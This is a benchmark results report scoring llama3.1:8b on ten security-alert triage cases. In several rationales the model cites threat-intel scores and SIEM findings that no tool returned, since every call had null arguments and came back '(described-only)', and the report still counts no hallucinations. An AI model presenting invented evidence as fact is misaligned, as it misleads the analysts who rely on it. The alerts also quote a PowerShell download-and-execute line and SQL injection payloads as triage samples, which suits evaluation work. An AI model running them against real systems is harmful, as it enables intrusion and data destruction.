# Playbook benchmark — `llama3.1:8b`

Model: `llama3.1:8b`  
Mode: **describe-only**  
Run started: 2026-05-06 02:50:07  
Cases: 10  
Format failures: 0  

## Summary

| Metric | Score |
|---|---|
| Composite context-understanding score | **85%** |
| Verdict accuracy | 10/10 (100%) |
| Severity accuracy | 10/10 (100%) |
| MITRE accuracy | 5/10 (50%) |
| Tool-selection accuracy | 9/10 (90%) |
| Format failures | 0/10 |
| Forbidden tool calls (e.g. auto-isolate on benign) | 0 |
| Not-found tool responses (hallucinated entities) | 0 |
| p50 latency | 2.4 s |
| p95 latency | 2.6 s |

## Per-case results

| Case | Expected | Verdict | Severity | MITRE | Tools | Latency |
|---|---|---|---|---|---|---|
| PB-1 | beni | PASS | PASS | PASS | PASS | 8.4s |
| PB-2 | inci | PASS | PASS | PASS | PASS | 2.5s |
| PB-3 | inci | PASS | PASS | FAIL | PASS | 2.4s |
| PB-4 | inci | PASS | PASS | FAIL | FAIL | 2.3s |
| PB-5 | inci | PASS | PASS | FAIL | PASS | 2.1s |
| PB-6 | inci | PASS | PASS | PASS | PASS | 2.4s |
| PB-7 | beni | PASS | PASS | PASS | PASS | 1.8s |
| PB-8 | inci | PASS | PASS | FAIL | PASS | 2.6s |
| PB-9 | inci | PASS | PASS | FAIL | PASS | 1.7s |
| PB-10 | inci | PASS | PASS | PASS | PASS | 2.4s |

## Per-case detail

### PB-1 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Single-event alert: user `alice` (laptop 10.0.4.22) authenticated to the corporate intranet at 09:02 local time on a workday and opened her email. No prior failed attempts. Source matches her usual IP range.

_Latency_: 8.36s · GPU 100%/14276MB · CPU 21% · RAM 32758MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Routine authentication by alice on her usual IP range; asset criticality is low, and SIEM shows no prior suspicious activity."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-2 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1078', 'T1078.002', 'T1021', 'T1021.001'])

_Alert_: Domain admin account `dom_admin_01` authenticated successfully from external IP 41.78.122.18 at 03:14 UTC. Within 4 minutes the same account opened 18 RDP sessions to internal hosts (DC01, FILER-02, FINANCE-DB, ENG-FILE, BACKUP-01, …).

_Latency_: 2.49s · GPU 83%/9280MB · CPU 14% · RAM 32276MB

_Tool calls_:
```
- threat_intel.lookup_ip(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1078"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Origin IP 41.78.122.18 has a malicious C2 verdict (score 95); the target hosts are all internal ops servers; SIEM shows dom_admin_01 opening 18 RDP sessions to multiple internal hosts within 4 minutes."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'siem.query_logs'])

### PB-3 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1110.004'])

_Alert_: Web server `webhost` (10.0.4.10): 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, including 3 successful logins to admin accounts. Sample source IP: 89.248.165.74.

_Latency_: 2.45s · GPU 82%/9280MB · CPU 18% · RAM 32340MB

_Tool calls_:
```
- threat_intel.lookup_ip(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1190"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Origin IP 89.248.165.74 has a malicious botnet verdict (score 95); SIEM shows large-scale POST requests to /wp-login.php and successful logins to admin accounts."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_ip', 'siem.query_logs'])

### PB-4 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1059.001', 'T1059', 'T1566.001', 'T1204', 'T1204.002'])

_Alert_: EDR alert on host WIN-DEV-04: `winword.exe` spawned `powershell.exe` which executed `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.15/a.ps1')`. User: dave.

_Latency_: 2.34s · GPU 82%/9280MB · CPU 22% · RAM 32351MB

_Tool calls_:
```
- threat_intel.lookup_hash(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1105"
  ],
  "tools_used": [
    "threat_intel.lookup_hash",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The PowerShell download string points to a malicious hash (score 95, c2 tag); the target host WIN-DEV-04 is medium-criticality; SIEM shows no prior auth events from user dave."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=FAIL

### PB-5 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1071.004', 'T1071', 'T1048.003', 'T1048'])

_Alert_: DNS server logs show internal host 10.0.4.55 issuing 4,000+ unique subdomain queries against `cdn-update.xyz` over 2 hours, with TXT-record responses averaging 200 bytes.

_Latency_: 2.13s · GPU 84%/9280MB · CPU 21% · RAM 32389MB

_Tool calls_:
```
- threat_intel.lookup_domain(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1132"
  ],
  "tools_used": [
    "threat_intel.lookup_domain",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Internal host 10.0.4.55 queried cdn-update.xyz (suspicious domain) over 2000 times in 2 hours; no prior DNS anomalies on this host."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_domain', 'cmdb.get_asset'])

### PB-6 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1078'])

_Alert_: sshd on host `webhost` (10.0.4.10) recorded 7 failed password attempts for distinct usernames (admin, root, oracle, postgres, git, test, ubuntu) from source IP 185.220.101.45 between 03:41:02 and 03:41:20, followed by a successful login as `ubuntu` from the same IP at 03:43:21.

_Latency_: 2.44s · GPU 83%/9282MB · CPU 13% · RAM 32389MB

_Tool calls_:
```
- threat_intel.lookup_ip(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1059",
    "T1078"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Origin IP 185.220.101.45 has a suspicious verdict (score 60); the target webhost had multiple failed logins against distinct users; SIEM shows prior auth events from the same IP."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset'])

### PB-7 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Routine sshd event on `webhost` (10.0.4.10): publickey login accepted for `alice` from 10.0.4.22 at 09:14:32. PAM session opened. systemd-logind started session 2841.

_Latency_: 1.81s · GPU 82%/9282MB · CPU 16% · RAM 32285MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Routine sshd event on low-criticality asset webhost; no corroborating signals from SIEM or threat intel."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-8 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1190'])

_Alert_: Apache access log on `webhost` (10.0.4.10) shows 4 requests from 185.62.190.13 within 4 seconds: `GET /products.php?id=1' OR '1'='1--`, `GET /products.php?id=1+UNION+SELECT+username,password+FROM+users--`, `GET /products.php?id=1;DROP+TABLE+users--`, `GET /products.php?id=1+AND+SLEEP(5)--`. The UNION SELECT request returned a 200 with a 4129-byte body.

_Latency_: 2.59s · GPU 83%/9282MB · CPU 11% · RAM 32274MB

_Tool calls_:
```
- threat_intel.lookup_ip(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1059",
    "T1068"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Origin IP 185.62.190.13 has a malicious C2 verdict (score 95); the target webhost is a low-criticality asset; SIEM shows multiple SQLi attempts against other web servers in the same network."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset'])

### PB-9 — expected: **incident** (severity ['medium', 'high'], MITRE ['T1098', 'T1548', 'T1136', 'T1078'])

_Alert_: On host `webhost` at 03:17:42, user `bob` (TTY pts/3) ran `sudo /usr/sbin/usermod -aG sudo svc_backup`. The change was applied (`add 'svc_backup' to group 'sudo'`). bob is a developer account with sudo rights but no documented need to modify service-account permissions at 03:17.

_Latency_: 1.74s · GPU 83%/9282MB · CPU 6% · RAM 32282MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1055"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "User bob modified service-account permissions on webhost, which is unusual for a developer account; SIEM shows no prior suspicious activity from this user."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['cmdb.get_asset', 'siem.query_logs'])

### PB-10 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1078', 'T1078.002'])

_Alert_: Domain controller DC01: 5 sequential EventID 4625 (BadPassword) events for account `Administrator`, LogonType 3, source IP 192.168.50.13 (workstation KIOSK-04) between 02:18:14 and 02:18:24, followed by an EventID 4624 (success) for the same account from the same IP at 02:21:42.

_Latency_: 2.37s · GPU 83%/9282MB · CPU 8% · RAM 32281MB

_Tool calls_:
```
- threat_intel.lookup_ip(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1078"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Origin IP 192.168.50.13 has an unknown verdict; the target DC01 is a high-criticality domain controller; SIEM shows multiple failed logins from the same IP in the last hour."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset', 'siem.query_logs'])
